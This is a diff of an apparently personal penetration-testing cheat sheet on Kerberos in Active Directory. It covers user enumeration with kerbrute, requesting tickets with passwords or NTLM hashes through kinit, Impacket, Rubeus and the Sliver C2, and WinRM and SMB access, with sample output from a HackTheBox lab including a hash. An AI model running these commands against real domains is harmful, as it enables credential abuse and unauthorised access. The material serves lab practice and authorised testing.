@@ -4,14 +4,14 @@ date: 2024-7-2
 tags: ["Kerberos", "Pass-The-Ticket", "Hash Cracking", "Rubeus", "Password Cracking", "Sliver", "Enumeration", "Ntlm", "Smb", "Kerbrute", "Pass-The-Hash", "Impacket", "Ticket Granting Ticket", "Domain Controller", "Active Directory", "Windows"]
 ---
 
-### Usernames enum
+### Users Enum
 
 {{< tab set1 tab1 >}}kerbrute{{< /tab >}}
 {{< tab set1 tab2 >}}metasploit{{< /tab >}}
 {{< tabcontent set1 tab1 >}}
 
 ```console
-kerbrute userenum --domain <DOMAIN> --dc <DC> <USERNAMES_FILE>
+kerbrute userenum --domain <DOMAIN> --dc <DC> <USERNAMES>
 ```
 
 ```console {class="sample-code"}
@@ -47,7 +47,7 @@ use auxiliary/gather/kerberos_enumusers
 ```
 
 ```console
-set user_file <USERNAMES_FILE>
+set user_file <USERNAMES>
 ```
 
 ```console
@@ -76,13 +76,15 @@ msf6 auxiliary(gather/kerberos_enumusers) > run
 
 {{< /tabcontent >}}
 
-### Usernames generator
+---
+
+### Usernames Generator
 
 {{< tab set2 tab1 >}}username-anarchy{{< /tab >}}
 {{< tabcontent set2 tab1 >}}
 
 ```console
-./username-anarchy -i <USERS_FILE> | tee <USERNAMES_FILE>
+./username-anarchy -i <USERS> | tee <USERNAMES>
 ```
 
 ```console {class="sample-code"}
@@ -101,13 +103,13 @@ jamerobe
 
 ---
 
-### Generate Kerberos ticket (From Linux)
+### Kerberos Ticket (From Linux)
 
-{{< tab set3 tab1 >}}Kinit{{< /tab >}}
-{{< tab set3 tab2 >}}Impacket{{< /tab >}}
+{{< tab set3 tab1 >}}kinit{{< /tab >}}
+{{< tab set3 tab2 >}}impacket{{< /tab >}}
 {{< tabcontent set3 tab1 >}}
 
-#### 1. Set up
+#### 1. Setup
 
 ```console
 # Step 0: Installation
@@ -175,7 +177,10 @@ sudo ntpdate -s <DC>
 $ sudo ntpdate -s dc.absolute.htb
 ```
 
-#### 2a. With Password
+#### 2. Request a Ticket
+
+{{< tab set3-1 tab1 active >}}Password{{< /tab >}}{{< tab set3-1 tab2 >}}NTLM{{< /tab >}}
+{{< tabcontent set3-1 tab1 >}}
 
 ```console
 kinit <USER>
@@ -186,7 +191,8 @@ $ kinit m.lovegod
 Password for m.lovegod@ABSOLUTE.HTB:
 ```
 
-#### 2b. With NTLM hash
+{{< /tabcontent >}}
+{{< tabcontent set3-1 tab2 >}}
 
 ```console
 ktutil
@@ -244,7 +250,9 @@ Using keytab: Administrator.keytab
 Authenticated to Kerberos v5
 ```
 
-#### 3. Check ticket
+{{< /tabcontent >}}
+
+#### 3. Check
 
 ```console
 klist
@@ -263,8 +271,12 @@ Valid starting     Expires            Service principal
 {{< /tabcontent >}}
 {{< tabcontent set3 tab2 >}}
 
+#### 1. Request a Ticket
+
+{{< tab set3-2 tab1 active >}}Password{{< /tab >}}{{< tab set3-2 tab2 >}}NTLM{{< /tab >}}
+{{< tabcontent set3-2 tab1 >}}
+
 ```console
-# With password
 sudo ntpdate -s <DC> && impacket-getTGT '<DOMAIN>/<USER>:<PASSWORD>' -dc-ip <DC_IP>
 ```
 
@@ -276,8 +288,10 @@ Password:
 [*] Saving ticket in m.lovegod.ccache
 ```
 
+{{< /tabcontent >}}
+{{< tabcontent set3-2 tab2 >}}
+
 ```console
-# With hash
 sudo ntpdate -s <DC> && impacket-getTGT '<DOMAIN>/<USER>' -hashes :<HASH> -dc-ip <DC_IP>
 ```
 
@@ -287,6 +301,10 @@ Impacket v0.13.0.dev0+20240916.171021.65b774de - Copyright Fortra, LLC and its a
 
 [*] Saving ticket in Administrator.ccache
 ```
+
+{{< /tabcontent >}}
+
+#### 2. Check
 
 ```console
 # Import ticket
@@ -314,13 +332,19 @@ Valid starting     Expires            Service principal
 
 {{< /tabcontent >}}
 
-### Generate Kerberos ticket (From Windows)
+---
+
+### Kerberos Ticket (From Windows)
 
 {{< tab set4 tab1 >}}rubeus{{< /tab >}}
 {{< tabcontent set4 tab1 >}}
 
+#### 1. Request a Ticket
+
+{{< tab set4-1 tab1 active >}}Password{{< /tab >}}{{< tab set4-1 tab2 >}}NTLM{{< /tab >}}
+{{< tabcontent set4-1 tab1 >}}
+
 ```console
-# With password
 .\rubeus.exe asktgt /user:<USER> /password:'<PASSWORD>' /enctype:AES256 /domain:<DOMAIN> /dc:<DC> /ptt /nowrap
 ```
 
@@ -361,8 +385,10 @@ Valid starting     Expires            Service principal
   ASREP (key)              :  7455663292585851686A2C8B2DF22DCA5B0A3E84404DD480466E982E49B10554
 ```
 
+{{< /tabcontent >}}
+{{< tabcontent set4-1 tab2 >}}
+
 ```console
-# With hash
 .\rubeus.exe asktgt /user:<USER> /rc4:<HASH> /domain:<DOMAIN> /dc:<DC> /ptt /nowrap
 ```
 
@@ -403,8 +429,11 @@ Valid starting     Expires            Service principal
   ASREP (key)              :  1F4A6093623653F6488D5AA24C75F2EA
 ```
 
+{{< /tabcontent >}}
+
+#### 2. Check
+
 ```console
-# Check
 klist
 ```
 
@@ -440,13 +469,19 @@ Cached Tickets: (2)
 
 {{< /tabcontent >}}
 
-### Generate Kerberos ticket (From C2)
+---
+
+### Kerberos Ticket (From Sliver)
 
 {{< tab set5 tab1 >}}Sliver{{< /tab >}}
 {{< tabcontent set5 tab1 >}}
 
+#### 1. Request a Ticket
+
+{{< tab set5-1 tab1 active >}}Password{{< /tab >}}{{< tab set5-1 tab2 >}}NTLM{{< /tab >}}
+{{< tabcontent set5-1 tab1 >}}
+
 ```console
-# With password
 rubeus -- 'asktgt /user:<USER> /password:<PASSWORD> /enctype:AES256 /domain:<DOMAIN> /dc:<DC> /ptt /nowrap'
 ```
 
@@ -490,8 +525,10 @@ sliver (helloworld) > rubeus -- 'asktgt /user:m.lovegod /password:AbsoluteLDAP20
   ASREP (key)              :  7455663292585851686A2C8B2DF22DCA5B0A3E84404DD480466E982E49B10554
 ```
 
+{{< /tabcontent >}}
+{{< tabcontent set5-1 tab2 >}}
+
 ```console
-# With hash
 rubeus -- 'asktgt /user:<USER> /rc4:<HASH> /domain:<DOMAIN> /dc:<DC> /ptt /nowrap'
 ```
 
@@ -534,8 +571,11 @@ sliver (helloworld) > rubeus -- 'asktgt /user:Administrator /rc4:1f4a6093623653f
   ASREP (key)              :  1F4A6093623653F6488D5AA24C75F2EA
 ```
 
+{{< /tabcontent >}}
+
+#### 2. Check
+
 ```console
-# Check
 c2tc-klist
 ```
 
@@ -563,7 +603,7 @@ Cached Tickets: (1)
 
 ---
 
-### Winrm with Kerberos
+### WinRM with Kerberos
 
 {{< tab set6 tab1 >}}evil-winrm{{< /tab >}}
 {{< tab set6 tab2 >}}wmiexec{{< /tab >}}
@@ -642,7 +682,7 @@ C:\>
 
 ---
 
-### Connect to SMB with Kerberos
+### SMB with Kerberos
 
 ```console
 sudo ntpdate -s <DC> && impacket-smbclient '<DOMAIN>/<USER>@<TARGET_DOMAIN>' -k -no-pass
